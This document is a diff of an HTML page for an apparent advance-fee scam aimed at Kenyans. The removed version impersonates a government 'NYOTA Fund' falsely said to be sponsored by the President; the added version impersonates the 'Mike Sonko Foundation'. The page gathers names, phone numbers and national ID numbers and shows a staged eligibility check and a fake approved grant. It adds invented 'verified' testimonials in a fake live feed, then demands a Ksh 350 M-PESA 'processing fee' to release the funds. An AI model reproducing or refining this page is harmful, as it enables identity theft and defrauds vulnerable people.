-        .feed-item .body .msg {
-            font-size: 0.65rem;
-            color: #555555;
-        }
-        .feed-item .body .time {
-            font-size: 0.5rem;
-            color: #999999;
-        }
-
-        /* ----- PROCESSING FEE SCREEN (formerly CRB) ----- */
-        #screen-crb {
-            background-color: #005A36;
-        }
-        .crb-title {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: #E8C84A;
-        }
-        .crb-sub {
-            color: #c0dcc8;
+            font-weight: bold;
             font-size: 0.8rem;
-            margin-top: 2px;
+            position: relative;
         }
-        .crb-box {
-            background: #FFFFFF;
-            border-radius: 16px;
-            padding: 16px;
-            text-align: center;
-            margin: 12px 0;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+        .check-item.active .check-circle {
+            border-color: var(--primary-blue);
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
         }
-        .crb-box .fee {
-            font-size: 2.2rem;
-            font-weight: 800;
-            color: #005A36;
+        .check-item.completed .check-circle {
+            background: #28a745;
+            border-color: #28a745;
+            color: white;
         }
-        .crb-box .fee-label {
-            font-size: 0.65rem;
-            color: #777777;
+        .check-item.completed .check-circle::after {
+            content: "✓";
         }
-        .crb-box .pay-note {
-            font-size: 0.65rem;
-            color: #555555;
-            margin-top: 2px;
-        }
-        .crb-box .pay-num {
-            color: #E8C84A;
-            font-weight: 700;
-        }
-        .btn-pay-crb {
-            width: 100%;
-            padding: 14px;
-            background: #E8C84A;
-            color: #005A36;
-            border: none;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .btn-pay-crb:hover {
-            background: #f0d86a;
-        }
-        .secure-badge {
-            text-align: center;
-            font-size: 0.6rem;
-            color: #c0dcc8;
-            margin-top: 4px;
-        }
-
-        /* ----- PAYMENT SCREEN ----- */
-        #screen-payment {
-            background-color: #005A36;
-        }
-        .pay-title {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: #FFFFFF;
-        }
-        #screen-payment > div:not(.pay-box):not(.approved-badge):not(.sponsor-line) {
-            color: #FFFFFF;
-        }
-        .pay-box {
-            background: #FFFFFF;
-            border-radius: 16px;
-            padding: 14px 16px;
-            margin: 12px 0;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-        }
-        .pay-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 6px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 0.85rem;
-        }
-        .pay-row:last-child {
-            border-bottom: none;
-        }
-        .pay-row .label {
-            color: #777777;
-        }
-        .pay-row .value {
-            color: #222222;
-            font-weight: 600;
-        }
-        .pay-row .value.ksh {
-            color: #005A36;
-            font-size: 1.1rem;
-        }
-        .pay-row .value.phone {
-            color: #E8C84A;
-        }
-        .btn-pay-now {
-            width: 100%;
-            padding: 14px;
-            background: #E8C84A;
-            color: #005A36;
-            border: none;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 4px;
-        }
-        .btn-pay-now:hover {
-            background: #f0d86a;
-        }
-        .btn-cancel {
-            width: 100%;
-            padding: 12px;
-            background: transparent;
-            color: #c0dcc8;
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 40px;
-            font-weight: 600;
-            font-size: 0.85rem;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 6px;
-        }
-        .btn-cancel:hover {
-            border-color: #E8C84A;
-            color: #FFFFFF;
-        }
-
-        /* ----- M-PESA PROMPT ----- */
-        #screen-mpesa {
-            background-color: #005A36;
-        }
-        .mpesa-icon {
-            text-align: center;
-            font-size: 2.8rem;
-            margin: 8px 0;
-        }
-        .mpesa-title {
-            font-size: 1.2rem;
-            font-weight: 700;
-            text-align: center;
-            color: #FFFFFF;
-        }
-        .mpesa-sub {
-            text-align: center;
-            color: #c0dcc8;
-            font-size: 0.8rem;
-            margin-top: 2px;
-        }
-        .mpesa-number {
-            color: #E8C84A;
-            font-weight: 700;
-        }
-        .mpesa-instruction {
-            background: #FFFFFF;
-            border-radius: 14px;
-            padding: 14px;
-            margin: 12px 0;
-            font-size: 0.85rem;
-            text-align: center;
-            color: #222222;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-        }
-        .mpesa-instruction .pin-hint {
-            color: #E8C84A;
-            font-weight: 600;
-        }
-        .listening {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-size: 0.8rem;
-            color: #4CAF50;
-            margin: 6px 0;
-            background: #FFFFFF;
-            padding: 10px;
-            border-radius: 30px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-        }
-        .listening .pulse-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #4CAF50;
+        .eligibility-spinner {
+            width: 80px;
+            height: 80px;
+            border: 6px solid #eef2f6;
+            border-top-color: var(--primary-blue);
             border-radius: 50%;
-            animation: pulse-dot 1.2s infinite;
+            animation: spin 1s linear infinite;
+            margin: 16px auto 24px;
         }
-        @keyframes pulse-dot {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.7); }
-        }
-        .mpesa-warn {
-            text-align: center;
-            font-size: 0.65rem;
-            color: #c0dcc8;
-            margin-top: 8px;
-        }
-
-        /* ----- APPROVED BADGE (generic) ----- */
-        .approved-badge {
-            text-align: center;
-            font-size: 0.5rem;
-            letter-spacing: 1.5px;
-            color: #80a090;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            padding-top: 10px;
-            margin-top: 10px;
-            flex-shrink: 0;
-        }
-        .approved-badge .ke {
-            color: #8bc34a;
-            font-weight: 700;
-        }
-
-        /* ----- UTILITY ----- */
-        .hidden { display: none !important; }
-        .flex-1 { flex: 1; }
-
-        /* ----- RESPONSIVE TWEAKS ----- */
-        @media (max-width: 440px) {
-            .phone-frame {
-                border-radius: 20px;
-                min-height: 90dvh;
-            }
-            .screen {
-                padding: 12px 14px 16px;
-            }
-            .brand-header {
-                padding: 10px 14px;
-            }
-            .brand-logo .logo-text {
-                font-size: 1rem;
-            }
-            .brand-logo .logo-sub {
-                font-size: 0.45rem;
-            }
-            .brand-logo .logo-tagline {
-                font-size: 0.4rem;
-            }
-            .welcome-title {
-                font-size: 1.1rem;
-            }
-            .btn {
-                padding: 10px 24px;
-                min-width: 80px;
-                font-size: 0.85rem;
-            }
-            .form-card {
-                padding: 16px 14px;
-            }
-            .form-group input,
-            .form-group select {
-                padding: 10px 12px;
-                font-size: 0.8rem;
-            }
-            .amount-box .ksh {
-                font-size: 2rem;
-            }
-            .crb-box .fee {
-                font-size: 1.8rem;
-            }
-            .purpose-list li {
-                padding: 10px 14px;
-                font-size: 0.9rem;
-            }
-            .feed {
-                padding: 8px 12px;
-            }
-            .feed-scroll {
-                max-height: 80px;
-            }
-        }
-        @media (max-height: 680px) {
-            .screen {
-                padding: 8px 12px 12px;
-            }
-            .brand-header {
-                padding: 6px 12px;
-            }
-            .brand-logo .logo-text {
-                font-size: 0.9rem;
-            }
-            .brand-logo .logo-sub {
-                font-size: 0.4rem;
-            }
-            .brand-logo .logo-tagline {
-                font-size: 0.35rem;
-            }
-            .welcome-icon {
-                font-size: 2rem;
-                margin: 4px 0;
-            }
-            .form-card {
-                padding: 12px 12px;
-            }
-            .form-group {
-                margin-bottom: 10px;
-            }
-            .form-group input,
-            .form-group select {
-                padding: 8px 10px;
-                font-size: 0.75rem;
-            }
-            .purpose-list li {
-                padding: 6px 12px;
-                margin-bottom: 4px;
-            }
-            .feed {
-                padding: 6px 10px;
-                margin: 6px 0;
-            }
-            .feed-scroll {
-                max-height: 70px;
-            }
-            .amount-box {
-                padding: 10px;
-                margin: 6px 0;
-            }
-            .crb-box {
-                padding: 10px;
-                margin: 6px 0;
-            }
-            .btn, .btn-submit, .btn-continue, .btn-withdraw, .btn-pay-crb, .btn-pay-now {
-                padding: 10px;
-                font-size: 0.85rem;
-            }
-            .sponsor-line {
-                padding-top: 4px;
-                margin-top: 4px;
-            }
-            .approved-badge {
-                padding-top: 4px;
-                margin-top: 4px;
-            }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="phone-frame" id="app">
-
-        <!-- ========== SCREEN 1: WELCOME (white background) ========== -->
-        <div class="screen active" id="screen-welcome">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
-                </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="welcome-icon">👩</div>
-            <div class="welcome-title">
-                Hi👩, Welcome to <br /><span class="gold">NYOTA FUND KENYA PHASE 2</span>
-            </div>
-            <div class="welcome-sub">
-                We are going to take you through some few questions<br />before you receive your funds. Are you ready for that?
-            </div>
-
-            <div class="btn-group">
-                <button class="btn btn-yes" id="btnYes">Yes</button>
-                <button class="btn btn-no" id="btnNo">No</button>
-            </div>
-
-            <div class="sponsor-line">
-                Sponsored by <strong>H.E. William Samoei Ruto</strong> · President of Kenya KE<br />
-                NYOTA Fund Kenya Phase 2 · 2025-2026 Youth Strategy
-            </div>
+<!-- ===== HOME PAGE ===== -->
+<div id="homePage" class="page active-page">
+    <div class="card" style="text-align:center;">
+        <h1 style="color:#1a2f4f;">Mike Sonko Foundation</h1>
+        <div class="hero-sub">Empowering Kenyans Through Dignity & Action</div>
+        <p style="color:#2c3e2f;max-width:90%;margin:0.8rem auto;font-size:0.9rem;">The Mike Sonko Foundation supports vulnerable communities across Kenya. Select a programme to apply for direct assistance.</p>
+        <div class="stats-row">
+            <div class="stat-badge"><span class="stat-number">80K+</span><span class="stat-label">LIVES CHANGED</span></div>
+            <div class="stat-badge"><span class="stat-number">47</span><span class="stat-label">COUNTIES</span></div>
+            <div class="stat-badge"><span class="stat-number">4</span><span class="stat-label">ACTIVE PROGRAMS</span></div>
         </div>
+    </div>
+    <h2 style="margin:0.2rem 0 0 0.2rem;color:#1a2f4f;">Our programmes</h2>
+    <div id="programmesContainer" class="programmes-grid"></div>
+    <footer>© 2026 Mike Sonko Foundation — Integrity, generosity, impact.</footer>
+</div>
 
-        <!-- ========== SCREEN 2: FORM (green background, white card form) ========== -->
-        <div class="screen" id="screen-form">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
-                </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="form-title">Kindly submit the following requirements</div>
-            <div class="form-sub">Fields marked <span class="gold">*</span> are required. Applicants must be 18 years or older.</div>
-
-            <div class="form-card">
-                <form id="applicationForm" autocomplete="off">
+<!-- ===== FORMS AREA ===== -->
+<div id="formsArea">
+    <div class="container">
+        <!-- STEP 1: APPLICATION -->
+        <div id="step1" class="page active">
+            <div class="card-body-white" style="padding:24px 20px;">
+                <div class="card-title" style="font-size:1.4rem; font-weight:800; text-align:center; color:var(--deep-navy);">Kindly submit the following requirements</div>
+                <div class="card-sub" style="font-size:0.8rem; color:#6c757d; text-align:center; margin-bottom:24px;">Fields marked <span class="required">*</span> are required · Applicants must be 18 years or older</div>
+                <form id="appForm" onsubmit="submitApplication(event)" novalidate>
                     <div class="form-group">
                         <label>Full Name <span class="required">*</span></label>
-                        <input type="text" id="fullName" placeholder="Full Name" required />
-                        <div class="form-hint">Name must contain letters only.</div>
+                        <div class="input-wrapper" id="fullNameWrapper">
+                            <input type="text" id="fullName" placeholder="Enter full name" required>
+                        </div>
+                        <div class="error-msg" id="nameError">Name must contain letters only.</div>
                     </div>
-
-                    <div class="form-group">
-                        <label>Phone Number <span class="required">*</span></label>
-                        <input type="tel" id="phoneNumber" placeholder="e.g. 0712345678" required />
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Phone Number <span class="required">*</span></label>
+                            <div class="input-wrapper" id="phoneNumberWrapper">
+                                <input type="tel" id="phoneNumber" placeholder="e.g. 0712345678" required>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>National ID <span class="required">*</span></label>
+                            <div class="input-wrapper" id="nationalIdWrapper">
+                                <input type="text" id="nationalId" placeholder="e.g. 12345678" required>
+                            </div>
+                        </div>
                     </div>
-
-                    <div class="form-group">
-                        <label>National ID <span class="required">*</span></label>
-                        <input type="text" id="nationalId" placeholder="e.g. 12345678" required />
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Age * (18+ only)</label>
+                            <div class="input-wrapper" id="ageWrapper">
+                                <input type="number" id="age" placeholder="e.g. 25" required>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Occupation / Job <span class="required">*</span></label>
+                            <div class="input-wrapper" id="occupationWrapper">
+                                <input type="text" id="occupation" placeholder="e.g. Farmer, Student" required>
+                            </div>
+                        </div>
                     </div>
-
-                    <div class="form-group">
-                        <label>Age (18+ only) <span class="required">*</span></label>
-                        <input type="number" id="age" placeholder="e.g. 25" min="18" required />
-                    </div>
-
-                    <div class="form-group">
-                        <label>Occupation / Job <span class="required">*</span></label>
-                        <input type="text" id="occupation" placeholder="e.g. Farmer, Student" required />
-                    </div>
-
                     <div class="form-group">
                         <label>County <span class="required">*</span></label>
-                        <select id="county" required>
-                            <option value="">Select County</option>
-                            <option>Baringo</option><option>Bomet</option><option>Bungoma</option>
-                            <option>Busia</option><option>Elgeyo-Marakwet</option><option>Embu</option>
-                            <option>Garissa</option><option>Homa Bay</option><option>Isiolo</option>
-                            <option>Kajiado</option><option>Kakamega</option><option>Kericho</option>
-                            <option>Kiambu</option><option>Kilifi</option><option>Kirinyaga</option>
-                            <option>Kisii</option><option>Kisumu</option><option>Kitui</option>
-                            <option>Kwale</option><option>Laikipia</option><option>Lamu</option>
-                            <option>Machakos</option><option>Makueni</option><option>Mandera</option>
-                            <option>Marsabit</option><option>Meru</option><option>Migori</option>
-                            <option>Mombasa</option><option>Murang'a</option><option>Nairobi</option>
-                            <option>Nakuru</option><option>Nandi</option><option>Narok</option>
-                            <option>Nyamira</option><option>Nyandarua</option><option>Nyeri</option>
-                            <option>Samburu</option><option>Siaya</option><option>Taita-Taveta</option>
-                            <option>Tana River</option><option>Tharaka-Nithi</option><option>Trans-Nzoia</option>
-                            <option>Turkana</option><option>Uasin Gishu</option><option>Vihiga</option>
-                            <option>Wajir</option><option>West Pokot</option>
-                        </select>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Email (optional)</label>
-                        <input type="email" id="email" placeholder="e.g. name@example.com" />
-                    </div>
-
-                    <div class="form-group">
-                        <label>NEXT OF KIN — OPTIONAL</label>
-                        <div class="form-row">
-                            <input type="text" id="kinName" placeholder="Kin Name" />
-                            <input type="tel" id="kinPhone" placeholder="Kin Phone" />
+                        <div class="input-wrapper" id="countyWrapper">
+                            <select id="county" required>
+                                <option value="">Select County</option>
+                                <option>Nairobi</option><option>Mombasa</option><option>Kisumu</option>
+                                <option>Nakuru</option><option>Eldoret</option><option>Meru</option>
+                                <option>Nyeri</option><option>Kisii</option><option>Bomet</option>
+                                <option>Kakamega</option><option>Machakos</option><option>Kilifi</option>
+                                <option>Garissa</option><option>Kitui</option><option>Embu</option>
+                                <option>Murang'a</option><option>Kiambu</option><option>Nyandarua</option>
+                                <option>Laikipia</option><option>Turkana</option><option>Marsabit</option>
+                                <option>Isiolo</option><option>Tharaka Nithi</option><option>Kirinyaga</option>
+                                <option>Kajiado</option><option>Narok</option><option>Taita Taveta</option>
+                                <option>Kwale</option><option>Tana River</option><option>Lamu</option>
+                                <option>Mandera</option><option>Wajir</option><option>Vihiga</option>
+                                <option>Bungoma</option><option>Busia</option><option>Nyamira</option>
+                            </select>
                         </div>
+                        <div class="error-msg" id="countyError">Please select your county.</div>
                     </div>
-
-                    <div class="form-group">
-                        <label>Where did you hear about NYOTA Project?</label>
-                        <select id="hearAbout">
-                            <option>Friend / Family</option>
-                            <option>Social Media</option>
-                            <option>Radio</option>
-                            <option>TV</option>
-                            <option>Newspaper</option>
-                            <option>Community Leader</option>
-                            <option>Other</option>
-                        </select>
-                    </div>
-
-                    <button type="submit" class="btn-submit">Submit Application</button>
+                    <button type="submit" class="btn-primary">Submit Application</button>
                 </form>
-            </div>
-
-            <div class="approved-badge">
-                NYOTA FUND KENYA PHASE 2 APPROVED <span class="ke">KE</span>
-            </div>
-            <div class="sponsor-line" style="border-top: none; padding-top: 2px; margin-top: 2px;">
-                Sponsored by <strong>H.E. William Samuel Ruto</strong> - President of Kenya &amp; NYOTA Fund Kenya Phase 2 - 2025-2028 Youth Strategy
+                <div class="approved-badge-card">
+                    <span>🇰🇪 MIKE SONKO FOUNDATION — DIGNITY & OPPORTUNITY</span>
+                    <span style="margin-top:4px; font-size:1.1rem;">🇰🇪</span>
+                </div>
             </div>
         </div>
 
-        <!-- ========== SCREEN 3: PROCESSING ========== -->
-        <div class="screen" id="screen-processing">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
+        <!-- ===== CHECKING ELIGIBILITY ANIMATED PAGE (Only for School Fees) ===== -->
+        <div id="checkingPage" class="page">
+            <div class="card-body-white" style="text-align: center; padding: 32px 20px;">
+                <div class="eligibility-spinner"></div>
+                <div style="font-size: 1.4rem; font-weight: 800; color: #212529; margin-bottom: 8px;">Checking your eligibility...</div>
+                <div style="font-size: 0.85rem; color: #6c757d; margin-bottom: 24px;" id="checkingSubtext">Hold on, we're reviewing your application.</div>
+                
+                <div class="check-item pending" id="check1">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Verifying national ID...</div>
                 </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="processing-icon">⚙️</div>
-            <div class="processing-title">REPUBLIC OF KENYA —<br />NYOTA FUND</div>
-            <div class="processing-sub">Official Processing System</div>
-
-            <div style="margin: 14px 0 6px; text-align: center; font-weight: 500; font-size: 1rem; color:#FFFFFF;">
-                Processing empowerment application...
-            </div>
-            <div class="processing-sub" style="font-size: 0.8rem;">
-                Please wait while we validate your information for empowerment disbursement.
-            </div>
-
-            <div class="spinner">
-                <span></span><span></span><span></span>
-            </div>
-
-            <div class="approved-badge">
-                NYOTA FUND KENYA PHASE 2 APPROVED <span class="ke">KE</span>
-            </div>
-            <div class="sponsor-line" style="border-top: none; padding-top: 2px; margin-top: 2px;">
-                Sponsored by <strong>H.E. William Samoei Ruto</strong> - President of Kenya KE
+                <div class="check-item pending" id="check2">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Checking phone number registration...</div>
+                </div>
+                <div class="check-item pending" id="check3">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Reviewing county records...</div>
+                </div>
+                <div class="check-item pending" id="check4">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Confirming age eligibility...</div>
+                </div>
+                <div class="check-item pending" id="check5">
+                    <div class="check-circle"></div>
+                    <div style="font-size: 0.88rem;">Scoring qualification tier...</div>
+                </div>
             </div>
         </div>
 
-        <!-- ========== SCREEN 4: FUND PURPOSE ========== -->
-        <div class="screen" id="screen-purpose">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
+        <!-- STEP 3: APPROVAL (Dynamic amount) -->
+        <div id="step3" class="page">
+            <div class="card-header-vibrant">
+                <div class="nav-header">
+                    <button class="back-btn" onclick="goBackHome()">←</button>
                 </div>
-                <span class="badge-ke">KE</span>
+                <div class="step-title" id="approvedGreeting">🎉 Congratulations!</div>
+                <div class="step-sub">Based on your application, you have been approved for the following assistance.</div>
             </div>
-
-            <div class="purpose-title">STEP 2 OF 3 - FUND PURPOSE</div>
-            <div style="font-size: 1rem; margin-top: 4px; color:#FFFFFF;">
-                <span class="purpose-name" id="purposeNameDisplay">kdjja</span>, what will you use your NYOTA Funds for?
-            </div>
-            <div style="font-size: 0.7rem; color: #c0dcc8; margin-top: 2px;">
-                Select the main purpose below to continue your application.
-            </div>
-
-            <ul class="purpose-list" id="purposeList">
-                <li data-value="1"><span class="num">1.</span> Start a business.</li>
-                <li data-value="2"><span class="num">2.</span> Top up a business.</li>
-                <li data-value="3"><span class="num">3.</span> Pay school fees.</li>
-                <li data-value="4"><span class="num">4.</span> Pay bills.</li>
-                <li data-value="5"><span class="num">5.</span> Pay rent.</li>
-            </ul>
-
-            <div style="font-size: 0.65rem; color: #c0dcc8; margin: -4px 0 10px;">
-                Kindly use your NYOTA Funds wisely and responsibly.
-            </div>
-
-            <button class="btn-continue" id="btnContinue" disabled>Continue →</button>
-
-            <div class="approved-badge" style="margin-top: 12px;">
-                KE NYOTA FUND KENYA PHASE 2 APPROVED <span class="ke">KE</span>
-            </div>
-        </div>
-
-        <!-- ========== SCREEN 5: ELIGIBILITY CHECK ========== -->
-        <div class="screen" id="screen-eligibility">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
+            <div class="card-body-white">
+                <div class="amount-display">
+                    <div class="label">YOUR APPROVED ASSISTANCE</div>
+                    <div class="value" id="approvalAmount">Ksh 0</div>
+                    <div class="sub">Eligibility verified · Ready for withdrawal</div>
+                    <div class="tiny-note">❤️ Your contribution supports school fees, business capital, maternal care & rent relief.</div>
                 </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="elig-title">Checking your eligibility...</div>
-            <div style="font-size: 0.95rem; margin-top: 2px; color:#FFFFFF;">
-                Hold on <span class="elig-name" id="eligNameDisplay">wdjfd</span>, we're reviewing your application.
-            </div>
-
-            <div class="checklist" id="eligChecklist">
-                <div class="item" data-check="id">
-                    <span class="icon pending">◌</span>
-                    <span>Verifying national ID...</span>
+                <button class="btn-primary btn-gold" style="font-size:1.05rem; margin-bottom:10px;" onclick="showDonationProcessingPage()">
+                    💰 Withdraw Funds
+                </button>
+                <div style="text-align:center; font-size:0.72rem; color:var(--accent-gold-dark); font-weight:600; display:flex; align-items:center; justify-content:center; gap:4px;">
+                    ⚡ Funds arrive in under 3 minutes after completion
                 </div>
-                <div class="item" data-check="phone">
-                    <span class="icon pending">◌</span>
-                    <span>Checking phone number registration...</span>
-                </div>
-                <div class="item" data-check="county">
-                    <span class="icon pending">◌</span>
-                    <span>Reviewing county records...</span>
-                </div>
-                <div class="item" data-check="age">
-                    <span class="icon pending">◌</span>
-                    <span>Confirming age eligibility...</span>
-                </div>
-                <div class="item" data-check="tier">
-                    <span class="icon pending">◌</span>
-                    <span>Scoring NYOTA Fund tier...</span>
-                </div>
-            </div>
-
-            <div class="sponsor-line" style="border-top: none; padding-top: 4px; margin-top: 4px;">
-                Sponsored by <strong>H.E. William Samoei Ruto</strong> · President of Kenya KE<br />
-                NYOTA Fund Kenya Phase 2 · 2025-2026 Youth Strategy
-            </div>
-        </div>
-
-        <!-- ========== SCREEN 6: APPROVAL ========== -->
-        <div class="screen" id="screen-approval">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
-                </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="approval-icon">🎉</div>
-            <div class="approval-title">
-                Congratulations, <span class="approval-name" id="approvalNameDisplay">WDJFD</span>!
-            </div>
-            <div class="approval-sub">
-                Based on our eligibility scan, you have been approved for the following NYOTA Fund amount. Withdraw your funds below.
-            </div>
-
-            <div class="amount-box">
-                <div style="font-size: 0.6rem; color: #777777; letter-spacing: 1.5px; margin-bottom: 2px;">
-                    YOUR APPROVED NYOTA FUND
-                </div>
-                <div class="ksh">Ksh 15,000</div>
-                <div class="sub">✔ Eligibility verified · Ready for withdrawal</div>
-            </div>
-
-            <div style="font-size: 0.55rem; color: #c0dcc8; text-align: center; margin: -4px 0 6px;">
-                Sponsored by H.E. William Samoei Ruto, President of Kenya KE · 2025 - 2026 Youth Strategy
-            </div>
-
-            <button class="btn-withdraw" id="btnWithdraw">Withdraw Funds</button>
-            <div class="withdraw-note">4 Funds arrive in under 3 minutes after clearance</div>
-
-            <!-- Live Community Feed -->
-            <div class="feed">
-                <div class="feed-header">
-                    <span><i class="fas fa-rss" style="color:#E8C84A; margin-right: 4px;"></i> Live Community Feed</span>
-                    <span class="live">● LIVE</span>
-                </div>
-                <div class="feed-scroll">
-                    <div class="feed-item">
-                        <div class="avatar">KO</div>
-                        <div class="body">
-                            <div><span class="name">Kevin Odhiambo</span> <span class="badge">Verified</span></div>
-                            <div class="msg">Nani mwingine amepata? Yangu imekubali na niko Kajiado saa hii.</div>
-                            <div class="time">Just now</div>
-                        </div>
+                <div style="margin-top:24px; border:1px solid #e9ecef; border-radius:16px; padding:16px; background:#ffffff;">
+                    <div style="font-size:0.95rem; font-weight:800; display:flex; align-items:center; gap:8px; margin-bottom:12px;">
+                        🔴 Live Community Feed
+                        <span class="feed-live">LIVE</span>
                     </div>
-                    <div class="feed-item">
-                        <div class="avatar">SW</div>
-                        <div class="body">
-                            <div><span class="name">Sarah Wambui</span> <span class="badge">Verified</span></div>
-                            <div class="msg">Hii kitu ni legit kabisa, nilikuwa nadhani ni uongo lakini 15k imefika.</div>
-                            <div class="time">10 seconds ago</div>
-                        </div>
+                    <div class="feed-container" id="feedContainer3"></div>
+                </div>
+                <div class="approved-badge-card">
+                    <span>🇰🇪 MIKE SONKO FOUNDATION — DIGNITY & OPPORTUNITY</span>
+                    <span style="margin-top:4px; font-size:1.1rem;">🇰🇪</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- DONATION PROCESSING FEE (Ksh 350) -->
+        <div id="donationProcessingPage" class="page">
+            <div class="card-header-vibrant" style="background: linear-gradient(135deg, #1a2f4f, #0a66c2);">
+                <div style="font-size:0.72rem; opacity:0.9; font-weight:700; margin-bottom:8px; text-transform:uppercase; letter-spacing:0.5px;">Donation Processing Fee</div>
+                <div class="step-title">Pay the processing fee to release your funds</div>
+            </div>
+            <div class="card-body-white">
+                <div class="fee-box">
+                    <div class="title">Donation Processing Fee</div>
+                    <div class="amount">Ksh 350</div>
+                    <div class="sub">Paid via M-PESA STK push</div>
+                </div>
+                <button class="btn-primary btn-gold" style="font-size:1.05rem; margin-bottom:16px;" onclick="processDonationFee()">
+                    Pay Ksh 350 to Process →
+                </button>
+                <div style="text-align:center; font-size:0.72rem; color:#6c757d; font-weight:500; margin-bottom:20px;">
+                    🔒 Secure payment · Funds released immediately after confirmation
+                </div>
+                <div id="donationFeeStatus" class="modal-status" style="margin-top:10px;"></div>
+                <div style="border:1px solid #e9ecef; border-radius:16px; padding:16px; background:#ffffff; margin-top:16px;">
+                    <div style="font-size:0.95rem; font-weight:800; display:flex; align-items:center; gap:8px; margin-bottom:12px;">
+                        🔴 Live Community Feed
+                        <span class="feed-live">LIVE</span>
                     </div>
-                    <div class="feed-item">
-                        <div class="avatar">PO</div>
-                        <div class="body">
-                            <div><span class="name">Peter Ochieng</span> <span class="badge">Verified</span></div>
-                            <div class="msg">Hii kitu ni leait kabisa. nilikuwa nadhani ni</div>
-                            <div class="time">30 seconds ago</div>
-                        </div>
+                    <div class="feed-container" id="feedContainerDonation"></div>
+                </div>
+                <div class="approved-badge-card">
+                    <span>🇰🇪 MIKE SONKO FOUNDATION — DIGNITY & OPPORTUNITY</span>
+                    <span style="margin-top:4px; font-size:1.1rem;">🇰🇪</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- DISBURSEMENT DETAILS -->
+        <div id="disbursementDetailsPage" class="page">
+            <div class="card-header-vibrant">
+                <div class="step-info">Disbursement Details</div>
+                <div class="step-title">Where should we send your funds?</div>
+                <div class="step-sub">Confirm the number and network to receive your assistance.</div>
+            </div>
+            <div class="card-body-white">
+                <div style="margin-bottom:16px;">
+                    <div style="font-size:0.72rem; font-weight:700; color:#212529; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">RECIPIENT FULL NAME</div>
+                    <div style="border:1.5px solid var(--accent-gold); border-radius:10px; padding:14px 16px; font-size:0.95rem; font-weight:700; color:var(--deep-navy);" id="disbRecipientName">—</div>
+                </div>
+                <div style="margin-bottom:16px;">
+                    <div style="font-size:0.72rem; font-weight:700; color:#212529; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:10px;">DISBURSEMENT NUMBER</div>
+                    <div style="display:flex; gap:10px; margin-bottom:10px;">
+                        <button id="sameNumBtn" onclick="selectDisbNumber('same')" style="flex:1;padding:14px;border:2px solid var(--accent-gold);background:#fef9f0;border-radius:10px;font-weight:700;font-size:0.85rem;color:var(--accent-gold-dark);cursor:pointer;display:flex;align-items:center;gap:8px;">
+                            ✅ Same Number<br><span id="sameNumDisplay" style="font-size:0.8rem;font-weight:500;"></span>
+                        </button>
